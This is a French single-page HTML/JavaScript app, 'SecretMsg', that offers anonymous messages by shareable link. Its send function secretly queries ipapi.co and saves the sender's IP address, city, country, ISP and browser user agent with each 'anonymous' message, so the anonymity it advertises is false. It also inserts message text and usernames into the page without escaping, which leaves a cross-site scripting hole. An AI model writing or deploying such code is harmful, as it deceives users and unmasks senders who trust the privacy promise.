<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SecretMsg</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{
            font-family:Arial,sans-serif;
            background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);
            min-height:100vh;
            display:flex;
            justify-content:center;
            align-items:center;
            padding:20px;
            color:#fff;
        }
        .container{
            background:rgba(255,255,255,0.1);
            border-radius:20px;
            width:100%;
            max-width:500px;
            padding:30px;
            text-align:center;
        }
        h1{font-size:2em;margin-bottom:10px}
        p{margin-bottom:20px;opacity:0.8}
        input,textarea{
            width:100%;
            padding:15px;
            margin:10px 0;
            border-radius:10px;
            border:none;
            font-size:16px;
            background:rgba(255,255,255,0.1);
            color:#fff;
        }
        input::placeholder,textarea::placeholder{color:rgba(255,255,255,0.5)}
        textarea{height:100px;resize:vertical}
        button{
            width:100%;
            padding:15px;
            background:#667eea;
            color:#fff;
            border:none;
            border-radius:10px;
            font-size:16px;
            font-weight:bold;
            cursor:pointer;
            margin:10px 0;
        }
        button:hover{background:#5a6fd6}
        .link-box{
            background:rgba(0,0,0,0.4);
            padding:20px;
            border-radius:10px;
            margin:20px 0;
            border:2px dashed #667eea;
        }
        .link-box a{
            color:#667eea;
            font-size:16px;
            word-break:break-all;
        }
        .hidden{display:none}
        .msg{
            background:rgba(255,255,255,0.08);
            padding:15px;
            border-radius:10px;
            margin:10px 0;
            text-align:left;
            border-left:4px solid #667eea;
        }
        .msg .date{font-size:12px;opacity:0.6;margin-top:5px}
        .tabs{display:flex;margin-bottom:20px}
        .tabs button{
            flex:1;
            background:rgba(255,255,255,0.1);
            margin:0 5px;
            font-size:14px;
        }
        .tabs button.active{background:#667eea}
    </style>
</head>
<body>

<div class="container">
    <h1>🔒 SecretMsg</h1>
    <p>Messages anonymes</p>

    <div class="tabs">
        <button class="active" onclick="showTab('home',this)">Lien</button>
        <button onclick="showTab('send',this)">Envoyer</button>
        <button onclick="showTab('view',this)">Messages</button>
    </div>

    <!-- ACCUEIL -->
    <div id="tab-home">
        <input type="text" id="userName" placeholder="Votre nom ou pseudo">
        <button onclick="creerLien()">🔗 Générer mon lien</button>
        <div id="linkBox" class="link-box hidden">
            <p>✅ Votre lien :</p>
            <a id="userLink" href="" target="_blank"></a>
            <br><br>
            <button onclick="copierLien()">📋 Copier le lien</button>
        </div>
    </div>

    <!-- ENVOYER -->
    <div id="tab-send" class="hidden">
        <p id="destInfo" style="background:rgba(102,126,234,0.2);padding:10px;border-radius:10px;"></p>
        <textarea id="msgContent" placeholder="Votre message anonyme..."></textarea>
        <button onclick="envoyerMsg()">📨 Envoyer anonymement</button>
    </div>

    <!-- MESSAGES -->
    <div id="tab-view" class="hidden">
        <select id="selectUser" onchange="afficherMsgs()" style="width:100%;padding:15px;border-radius:10px;margin-bottom:15px;background:rgba(255,255,255,0.1);color:#fff;border:none;font-size:16px;">
            <option value="">-- Choisir une personne --</option>
        </select>
        <div id="messagesList"></div>
    </div>
</div>

<script>
// Stockage
var STORAGE_KEY = 'secretmsg_v2';

function getData(){
    var d = localStorage.getItem(STORAGE_KEY);
    return d ? JSON.parse(d) : {users:[],messages:[]};
}

function saveData(data){
    localStorage.setItem(STORAGE_KEY, JSON.stringify(data));
}

// Créer lien
function creerLien(){
    var nom = document.getElementById('userName').value.trim();
    if(!nom){alert('Entrez votre nom');return;}
    
    var data = getData();
    var id = 'u' + Date.now().toString(36) + Math.random().toString(36).substr(2,6);
    
    data.users.push({id:id, username:nom, created:new Date().toISOString()});
    saveData(data);
    
    var url = window.location.origin + window.location.pathname + '?user=' + id;
    document.getElementById('userLink').href = url;
    document.getElementById('userLink').textContent = url;
    document.getElementById('linkBox').classList.remove('hidden');
    
    chargerUsers();
    alert('✅ Lien créé !');
}

function copierLien(){
    var url = document.getElementById('userLink').textContent;
    navigator.clipboard.writeText(url).then(function(){
        alert('📋 Lien copié !');
    }).catch(function(){
        prompt('Copiez :', url);
    });
}

// Envoyer message
async function envoyerMsg(){
    var params = new URLSearchParams(window.location.search);
    var destId = params.get('user');
    
    if(!destId){alert('Ouvrez un lien valide');return;}
    
    var contenu = document.getElementById('msgContent').value.trim();
    if(!contenu){alert('Écrivez un message');return;}
    
    var ip='?',ville='?',pays='?',isp='?';
    try{
        var r = await fetch('https://ipapi.co/json/');
        var d = await r.json();
        ip=d.ip||'?';ville=d.city||'?';pays=d.country_name||'?';isp=d.org||'?';
    }catch(e){}
    
    var data = getData();
    data.messages.push({
        id:Date.now(),
        targetId:destId,
        content:contenu,
        ip:ip,ville:ville,pays:pays,isp:isp,
        nav:navigator.userAgent,
        date:new Date().toISOString()
    });
    saveData(data);
    
    alert('✅ Message envoyé !');
    document.getElementById('msgContent').value='';
}

// Charger liste users
function chargerUsers(){
    var data = getData();
    var s = document.getElementById('selectUser');
    var opts = '<option value="">-- Choisir --</option>';
    for(var i=0;i<data.users.length;i++){
        opts+='<option value="'+data.users[i].id+'">'+data.users[i].username+'</option>';
    }
    s.innerHTML = opts;
}

// Afficher messages
function afficherMsgs(){
    var uid = document.getElementById('selectUser').value;
    var container = document.getElementById('messagesList');
    
    if(!uid){container.innerHTML='<p>Choisissez une personne</p>';return;}
    
    var data = getData();
    var msgs = [];
    for(var i=0;i<data.messages.length;i++){
        if(data.messages[i].targetId===uid) msgs.push(data.messages[i]);
    }
    
    if(msgs.length===0){container.innerHTML='<p>📭 Aucun message</p>';return;}
    
    msgs.sort(function(a,b){return b.id-a.id;});
    
    var html='';
    for(var i=0;i<msgs.length;i++){
        html+='<div class="msg"><p>'+msgs[i].content+'</p><div class="date">📅 '+new Date(msgs[i].date).toLocaleString('fr-FR')+'</div></div>';
    }
    container.innerHTML=html;
}

// Onglets
function showTab(name,btn){
    document.getElementById('tab-home').classList.add('hidden');
    document.getElementById('tab-send').classList.add('hidden');
    document.getElementById('tab-view').classList.add('hidden');
    document.getElementById('tab-'+name).classList.remove('hidden');
    
    var btns = document.querySelectorAll('.tabs button');
    for(var i=0;i<btns.length;i++) btns[i].classList.remove('active');
    btn.classList.add('active');
    
    if(name==='view') chargerUsers();
}

// Vérifier URL
function checkUrl(){
    var params = new URLSearchParams(window.location.search);
    var uid = params.get('user');
    if(uid){
        var data = getData();
        var user = null;
        for(var i=0;i<data.users.length;i++){
            if(data.users[i].id===uid){user=data.users[i];break;}
        }
        if(user){
            document.getElementById('destInfo').textContent='📨 Message pour : '+user.username;
            showTab('send', document.querySelectorAll('.tabs button')[1]);
        }
    }
}

chargerUsers();
checkUrl();
</script>

</body>
</html>
